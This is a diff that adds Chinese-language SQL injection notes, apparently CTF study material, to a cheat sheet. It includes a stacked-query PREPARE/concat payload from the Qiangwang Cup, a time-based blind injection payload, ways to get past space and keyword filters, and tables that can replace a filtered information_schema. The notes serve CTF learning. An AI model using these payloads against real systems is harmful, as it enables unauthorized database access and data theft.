@@ -469,3 +469,46 @@ for i in range(1,100):
         else:
             continue
 ```
+
+## handler
+handler，这个语句可以一行一行显示库中内容
+```sql
+handler user open;
+handler user read;读出什么输出什么
+
+handler user read first [where username=‘admin’];
+handler user read next [where username=‘admin’]; – [] 中的内容意味着可加可不加
+```
+
+>需要先open才能read
+
+## prepare 预处理
+### 强网杯 随便注
+#sql-prepare
+```sql
+1';PREPARE st from concat('s','elect', ' * from `1919810931114514` ');EXECUTE st;#
+```
+
+
+## 空格过滤
+### 注释绕过
+`/**/`是注释符，用注释替换空格
+>`/*! ... */`在mysql中可执行
+>`/*!50001 select * from test */; `这里的50001表示假如 数据库是5.00.01以上版本，该语句才会被推行
+
+### 括号绕过
+在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。
+```sql
+?id=1%27and(sleep(ascii(mid(database()from(1)for(1)))=109))%23
+```
+
+### 特殊字符
+```
+%20 %09 %0a %0b %0c %0d %a0 %00
+```
+
+## 特殊表过滤
+
+### information_schema
+- sys.schema_table_statistics_with_buffer
+- sys.x$schema_flattened_keys
